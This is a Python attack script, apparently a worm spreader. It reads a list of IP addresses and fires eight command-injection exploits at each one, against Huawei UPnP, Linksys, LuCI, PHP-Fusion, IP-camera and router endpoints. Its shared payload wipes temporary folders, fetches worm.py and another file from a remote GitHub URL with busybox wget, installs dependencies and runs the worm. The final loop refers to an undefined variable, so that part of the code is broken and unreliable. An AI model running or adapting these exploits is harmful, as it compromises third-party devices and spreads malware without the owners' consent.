#! python !#
import threading, urllib3, requests, base64, urllib
from requests.auth import HTTPDigestAuth
from decimal import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random

cmd1 = "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; busybox wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/ioT2.txt; busybox wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/worm.py; sudo apt -y install python3-pip; sudo apt-get -y install python-paramiko; sudo apt-get -y install python-netifaces; chmod a+x worm.py; chmod a+x ioT2.txt; python3 worm.py"
payload1 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(104.248.4.226)</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

url_data = {
    "submit_button": "",
    "change_action": "",
    "action": "",
    "commit": "0",
    "ttcp_num": "2",
    "ttcp_open": "2",
    "ttcp_size": "2",
    "ttcp_ip": "-h `"+cmd1+"`",
    "StartEPI": "1",
}

def run(IP,NULLED):
 try:
    print(f'[ DeviceUpgrade_1 ] {IP} HUAWEI EXPLOIT . . .')
    url = "http://" + IP + ":37215/ctrlt/DeviceUpgrade_1"
    requests.post(url, timeout=3, data=payload1, auth=HTTPDigestAuth('dslf-config', 'admin'))
 except Exception as e:
   pass

def run2(IP,NULLED):
 try:
    print(f"[ Masteripcam ] {IP} EXPLOIT . . .")
    url = "http://" + IP + "/cgi-bin/p2p.cgi?cmd=`"+cmd1+"`"
    requests.get(url, timeout=3)
 except Exception as e:
   pass

def run3(IP,NULLED):
 try:
    print(f"[ LINKSYS ] {IP} EXPLOIT . . .")
    url = "http://"+IP+":8080/tmUnblock.cgi"
    requests.post(url, data=url_data, timeout=3)
    requests.get(url, timeout=3)
 except Exception as e:
   pass

def run4(IP,NULLED):
    try:
        print(F"[ SITEBAR ] {IP} EXPLOIT . . .")
        url = "http://" + IP + "/translator.php?lang=zh_CN&cmd=upd&edit=$GET['lang'];system('"+cmd1+"');"
        requests.get(url, timeout=3)
    except Exception as e:
     pass

def run5(host,nulled):
    PAYLOAD = "php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\""+cmd1+"\");'  "
    REQUEST_PAYLOAD = "/infusions/downloads/downloads.php?cat_id=$\{{system(base64_decode({})).exit\}}"
    PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode('ascii')).decode("ascii").strip("=")
    try:
        page_data = requests.get("http://" + host + "/infusions/downloads/downloads.php?cat_id=${system(ls)}")
        if "infusion_db.php" in page_data.text:
            requests.get(host + REQUEST_PAYLOAD.format(PAYLOAD_B64))
            print(f"[ PHPFusion ] {host} EXPLOIT . . .")
    except:
        pass

def run6(IP,NULLED):
   code = urllib.parse.quote(cmd1)
   url_command = "https://" + IP + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + code + ")"
   try:
      print(f"[ CONDI ] {IP} EXPLOIT . . .")
      r = requests.get(url_command, verify=False)
      r = requests.get(url_command, verify=False)
   except Exception as e:
      pass

def run7(IP,NULLED):
    payload = F"time1=00:00-00:00&time2=00:00-00:00&mac=;{IP};"
    url = f"http://{IP}/goform/set_LimitClient_cfg"
    try:
        response = requests.post(url, json=payload, timeout=10)
        print(f"[ CONDIv2 ] {IP} EXPLOIT . . .")
    except requests.RequestException as e:
        pass

def run8(ip,NULLED):
    headers = {
    'Command1': 'ls',
    'Confirm1': 'apply'
    }
    url = f"http://{ip}/EXCU_SHELL"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        print(f"[ CONDIv3 ] {ip} EXPLOIT . . .")
    except requests.RequestException as e:
        pass

def exploits(ip,nulled):
   threading.Thread(target=run,args=(ip,0)).start()
   threading.Thread(target=run2,args=(ip,0)).start()
   threading.Thread(target=run3,args=(ip,0)).start()
   threading.Thread(target=run4,args=(ip,0)).start()
   threading.Thread(target=run5,args=(ip,0)).start()
   threading.Thread(target=run6,args=(ip,0)).start()
   threading.Thread(target=run7,args=(ip,0)).start()
   threading.Thread(target=run8,args=(ip,0)).start()

ips = []
with open(input('FILES'),'r') as f:
    for i in f.readlines():
        i.replace('\n','')
        if i not in ips:
          ips.append(i)
for i2 in ips2:
   try:
       r = requests.get(ips,timeout=3)
       threading.Thread(target=exploits,args=(ips,0)).start()
   except:
    pass
